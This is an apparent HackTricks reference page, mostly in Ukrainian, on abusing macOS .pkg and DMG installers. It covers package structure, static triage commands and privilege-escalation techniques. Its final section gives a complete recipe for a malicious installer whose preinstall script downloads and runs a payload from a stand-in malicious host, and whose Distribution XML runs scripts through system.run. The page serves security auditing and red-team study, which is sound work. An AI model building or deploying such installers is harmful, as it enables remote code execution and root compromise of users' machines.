# macOS Installers Abuse

{{#include ../../../banners/hacktricks-training.md}}

## Pkg Basic Information

Пакет встановлення macOS **installer package** (також відомий як файл `.pkg`) — це формат файлу, який використовується macOS для **розповсюдження програмного забезпечення**. Ці файли схожі на **коробку, яка містить усе, що потрібно програмі** для коректного встановлення та запуску.

Сам файл пакета є архівом, який містить **ієрархію файлів і каталогів, що буде встановлена на цільовому** комп'ютері. Він також може містити **скрипти** для виконання завдань до та після встановлення, наприклад налаштування файлів конфігурації або очищення старих версій програмного забезпечення.

### Hierarchy

<figure><img src="../../../images/Pasted Graphic.png" alt="https://www.youtube.com/watch?v=iASSG0_zobQ"><figcaption></figcaption></figure>

- **Distribution (xml)**: Customizations (title, welcome text…) and script/installation checks
- **PackageInfo (xml)**: Info, install requirements, install location, paths to scripts to run
- **Bill of materials (bom)**: List of files to install, update or remove with file permissions
- **Payload (CPIO archive gzip compressed)**: Files to install in the `install-location` from PackageInfo
- **Scripts (CPIO archive gzip compressed)**: Pre and post install scripts and more resources extracted to a temp directory for execution.

### Decompress
```bash
# Tool to directly get the files inside a package
pkgutil --expand "/path/to/package.pkg" "/path/to/out/dir"

# Get the files in a more manual way
mkdir -p "/path/to/out/dir"
cd "/path/to/out/dir"
xar -xf "/path/to/package.pkg"

# Decompress also the CPIO gzip compressed ones
cat Scripts | gzip -dc | cpio -i
cpio -i < Scripts
```
Щоб візуалізувати вміст інсталятора без ручного розпакування, ви також можете використати безплатний інструмент [**Suspicious Package**](https://mothersruin.com/software/SuspiciousPackage/).

### Static triage shortcuts

Якщо мета — аналіз, спробуйте **спочатку уникати відкриття пакета через `Installer.app`**. Деякі пакети можуть виконувати код одразу після того, як Installer відкриває їх (наприклад, через `system.run()` або installer plug-ins), тож офлайн-екстракція зазвичай є безпечнішим початковим кроком.
```bash
PKG="Suspicious.pkg"
OUT="/tmp/pkg-audit"

# Preserve Distribution, scripts, resources and nested component pkgs
pkgutil --expand-full "$PKG" "$OUT"

# Signature / policy checks
pkgutil --check-signature "$PKG"
spctl -a -vv -t install "$PKG"

# Quick hunting: scripts, BOM contents and interesting primitives
find "$OUT" -type f \( -name preinstall -o -name postinstall \) -print -exec head -n 1 {} \;
find "$OUT" -type f \( -name Bom -o -name '*.bom' \) -exec lsbom -pf {} \; 2>/dev/null
xmllint --format "$OUT/Distribution" 2>/dev/null | sed -n '1,200p'
rg -n 'system\.(run|runOnce)|<script>|launchctl|osascript|curl|chmod 4[0-7]{3}|sudo -u |\$USER|\$HOME|/tmp/|/var/tmp/' "$OUT"
```
## DMG Basic Information

DMG files, або Apple Disk Images, — це формат файлів, який macOS від Apple використовує для disk images. Файл DMG по суті є **mountable disk image** (він містить власну файлову систему), яка містить raw block data, зазвичай стиснені, а іноді й зашифровані. Коли ви відкриваєте файл DMG, macOS **монтує його так, ніби це фізичний диск**, що дозволяє вам отримати доступ до його вмісту.

> [!CAUTION]
> Зверніть увагу, що інсталятори **`.dmg`** підтримують **так багато форматів**, що в минулому деякі з них, які містили вразливості, зловживалися для отримання **kernel code execution**.

### Hierarchy

<figure><img src="../../../images/image (225).png" alt=""><figcaption></figcaption></figure>

Ієрархія файла DMG може відрізнятися залежно від вмісту. Однак для application DMGs вона зазвичай має таку структуру:

- Top Level: Це корінь disk image. Він часто містить application і, можливо, посилання на папку Applications.
- Application (.app): Це і є сам application. У macOS application зазвичай є package, який містить багато окремих файлів і папок, що формують application.
- Applications Link: Це ярлик до папки Applications у macOS. Його призначення — полегшити вам install application. Ви можете перетягнути файл .app на цей ярлик, щоб install the app.

## Privesc via pkg abuse

### Execution from public directories

Якщо pre або post installation script, наприклад, виконується з **`/var/tmp/Installerutil`**, і атакувальник може контролювати цей script, він може підвищити привілеї кожного разу, коли його буде виконано. Або інший схожий приклад:

<figure><img src="../../../images/Pasted Graphic 5.png" alt="https://www.youtube.com/watch?v=iASSG0_zobQ"><figcaption><p><a href="https://www.youtube.com/watch?v=kCXhIYtODBg">https://www.youtube.com/watch?v=kCXhIYtODBg</a></p></figcaption></figure>

### AuthorizationExecuteWithPrivileges

Це [public function](https://developer.apple.com/documentation/security/1540038-authorizationexecutewithprivileg), яку кілька installers і updaters викликають, щоб **execute something as root**. Ця function приймає **path** до **file**, який потрібно **execute**, як параметр, однак якщо атакувальник зможе **modify** цей file, він зможе **abuse** його виконання з root, щоб **escalate privileges**.
```bash
# Breakpoint in the function to check which file is loaded
(lldb) b AuthorizationExecuteWithPrivileges
# You could also check FS events to find this misconfig
```
Для додаткової інформації дивіться цю доповідь: [https://www.youtube.com/watch?v=lTOItyjTTkw](https://www.youtube.com/watch?v=lTOItyjTTkw)

### Зловживання Environment and shebang

Сучасні баги PackageKit показали, що installer scripts часто виконуються як **trusted root code**, при цьому поруч все ще зберігається attacker-controlled context. Під час аудиту vendor packages звертайте особливу увагу на:

- Shell interpreters, такі як `#!/bin/zsh` / `#!/bin/bash`
- Виклики на кшталт `sudo -u $USER`, `launchctl asuser`, або будь-яку логіку, що довіряє `$USER`, `$HOME`, `PATH`, `TMPDIR` чи relative paths
- Non-shell interpreters, які можуть завантажувати user-controlled init files або libraries
```bash
pkgutil --expand-full Target.pkg /tmp/target-pkg
find /tmp/target-pkg -type f \( -name preinstall -o -name postinstall \) -exec sh -c 'printf "\n### %s\n" "$1"; head -n 1 "$1"' sh {} \;
rg -n '^#!/bin/(zsh|bash)|sudo -u |launchctl asuser|\$USER|\$HOME|PATH=|/usr/bin/env ' /tmp/target-pkg
```
Для багу root-environment у PackageKit 2024 (`~/.zshenv` / `~/.bash*` успадкування під час інсталяцій, ініційованих користувачем), див. [generic macOS privesc page](../macos-privilege-escalation.md). Якщо пакет **Apple-signed**, той самий bug зі script може стати **SIP/TCC-relevant**, оскільки `system_installd` може мати `com.apple.rootless.install.heritable`; див. [the SIP page](../macos-security-protections/macos-sip.md).

### Execution by mounting

Якщо installer записує у `/tmp/fixedname/bla/bla`, можна **створити mount** поверх `/tmp/fixedname` з noowners, щоб можна було **змінювати будь-який файл під час installation** і зловживати процесом installation.

Прикладом цього є **CVE-2021-26089**, який зміг **перезаписати periodic script** і отримати execution як root. Для більшої інформації подивіться talk: [**OBTS v4.0: "Mount(ain) of Bugs" - Csaba Fitzl**](https://www.youtube.com/watch?v=jSYPazD4VcE)

## pkg as malware

### Empty Payload

Можна просто згенерувати **`.pkg`** file з **pre and post-install scripts** без будь-якого real payload, окрім malware всередині scripts.

### JS in Distribution xml

Можна додати теги **`<script>`** у **distribution xml** file пакета, і цей code буде виконано, а також він може **execute commands** using **`system.run`**:

<figure><img src="../../../images/image (1043).png" alt=""><figcaption></figcaption></figure>

У distribution packages це зазвичай залежить від того, чи top-level `Distribution` file увімкнув external scripts, наприклад через `allow-external-scripts="true"`. Тому перевірка лише `preinstall` / `postinstall` недостатня: сам **Distribution XML** може містити hooks `installation-check` / `volume-check` і прямі paths виконання `system.run()` / `system.runOnce()`.
```bash
xmllint --format Distribution | sed -n '1,200p'
rg -n 'allow-external-scripts|system\.(run|runOnce)|installation-check|volume-check|function ' Distribution
```
### Зловмисний інсталятор

Шкідливий інсталятор із використанням script і JS code всередині dist.xml
```bash
# Package structure
mkdir -p pkgroot/root/Applications/MyApp
mkdir -p pkgroot/scripts

# Create preinstall scripts
cat > pkgroot/scripts/preinstall <<EOF
#!/bin/bash
echo "Running preinstall script"
curl -o /tmp/payload.sh http://malicious.site/payload.sh
chmod +x /tmp/payload.sh
/tmp/payload.sh
exit 0
EOF

# Build package
pkgbuild --root pkgroot/root --scripts pkgroot/scripts --identifier com.malicious.myapp --version 1.0 myapp.pkg

# Generate the malicious dist.xml
cat > ./dist.xml <<EOF
<?xml version="1.0" encoding="utf-8"?>
<installer-gui-script minSpecVersion="1">
<title>Malicious Installer</title>
<options allow-external-scripts="true" customize="allow" require-scripts="true"/>
<script>
<![CDATA[
function installationCheck() {
if (system.isSandboxed()) {
my.result.title = "Cannot install in a sandbox.";
my.result.message = "Please run this installer outside of a sandbox.";
return false;
}
return true;
}
function volumeCheck() {
return true;
}
function preflight() {
system.run("/path/to/preinstall");
}
function postflight() {
system.run("/path/to/postinstall");
}
]]>
</script>
<choices-outline>
<line choice="default">
<line choice="myapp"/>
</line>
</choices-outline>
<choice id="myapp" title="MyApp">
<pkg-ref id="com.malicious.myapp"/>
</choice>
<pkg-ref id="com.malicious.myapp" installKBytes="0" auth="root">#myapp.pkg</pkg-ref>
</installer-gui-script>
EOF

# Build final
productbuild --distribution dist.xml --package-path myapp.pkg final-installer.pkg
```
## References

- [**DEF CON 27 - Unpacking Pkgs A Look Inside Macos Installer Packages And Common Security Flaws**](https://www.youtube.com/watch?v=iASSG0_zobQ)
- [**OBTS v4.0: "The Wild World of macOS Installers" - Tony Lambert**](https://www.youtube.com/watch?v=Eow5uNHtmIg)
- [**DEF CON 27 - Unpacking Pkgs A Look Inside MacOS Installer Packages**](https://www.youtube.com/watch?v=kCXhIYtODBg)
- [https://redteamrecipe.com/macos-red-teaming?utm_source=pocket_shared#heading-exploiting-installer-packages](https://redteamrecipe.com/macos-red-teaming?utm_source=pocket_shared#heading-exploiting-installer-packages)
- [**CVE-2024-27822: macOS PackageKit Privilege Escalation**](https://khronokernel.com/macos/2024/06/03/CVE-2024-27822.html)
- [**Breaking SIP with Apple-signed Packages**](https://www.l3harris.com/newsroom/editorial/2024/03/breaking-sip-apple-signed-packages)

{{#include ../../../banners/hacktricks-training.md}}
